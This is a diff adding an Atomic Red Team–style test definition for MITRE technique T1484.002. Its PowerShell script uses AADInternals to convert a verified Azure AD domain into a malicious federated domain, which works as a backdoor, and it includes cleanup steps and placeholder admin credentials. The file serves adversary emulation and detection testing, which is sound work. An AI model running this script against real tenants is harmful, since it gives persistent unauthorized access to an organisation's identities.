@@ -1,0 +1,44 @@
+{
+  "attack_technique": "T1484.002",
+  "display_name": "Domain Trust Modification",
+  "atomic_tests": [
+    {
+      "name": "Add Federation to Azure AD",
+      "description": "Add a new federated domain to Azure AD using PowerShell.\nThe malicious domain to be federated must be configured beforehand (outside of the scope of this test):\n    1. Open Azure Portal\n    2. Add a new \"custom domain name\"\n    3. Verify the domain by following instructions (i.e. create the requested DNS record)",
+      "supported_platforms": [
+        "azure-ad"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "Import-Module AzureAD\nImport-Module AADInternals\n\n$PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n\ntry {\n  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null\n}\ncatch {\n  Write-Host \"Error: AzureAD could not connect\"\n  exit 1\n}\n\ntry {\n  $domain = Get-AzureADDomain -Name \"#{domain_name}\"\n}\ncatch {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not found\"\n  exit 1\n}\nif (-Not $domain.IsVerified) {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not verified\"\n  exit 1\n}\n\nif ($domain.AuthenticationType -eq \"Federated\") {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" already federated. Try with a different domain or re-create it before.\"\n  exit 1\n}\n\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\nif (-Not $at) {\n  Write-Host \"Error: AADInternals could not connect\"\n  exit 1\n}\n\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"#{domain_name}\"\nif ($new) {\n  Write-Host \"Federation successfully added to Azure AD\"\n  Write-Host $new\n}\nelse {\n  Write-Host \"The federation setup failed\"\n}\n\nWrite-Host \"End of federation configuration.\"",
+        "cleanup_command": "try {\n  Import-Module AzureAD -ErrorAction Ignore\n\n  $PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n  Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n  Remove-AzureADDomain -Name \"#{domain_name}\" -ErrorAction Ignore\n} catch {}"
+      },
+      "input_arguments": {
+        "azure_username": {
+          "description": "Username of a privileged Azure AD account such as External Identity Provider Administrator or Global Administrator roles",
+          "type": "string",
+          "default": "bruce.wayne@contosocloud.com"
+        },
+        "azure_password": {
+          "description": "Password of azure_username",
+          "type": "string",
+          "default": "iamthebatman"
+        },
+        "domain_name": {
+          "description": "Malicious federated domain name",
+          "type": "string",
+          "default": "contoso.com"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "AzureAD and AADInternals Powershell modules must be installed.",
+          "prereq_command": "if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}",
+          "get_prereq_command": "Install-Module -Name AzureAD -Force\nInstall-Module -Name AADInternals -Force"
+        }
+      ],
+      "auto_generated_guid": "8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7"
+    }
+  ]
+}
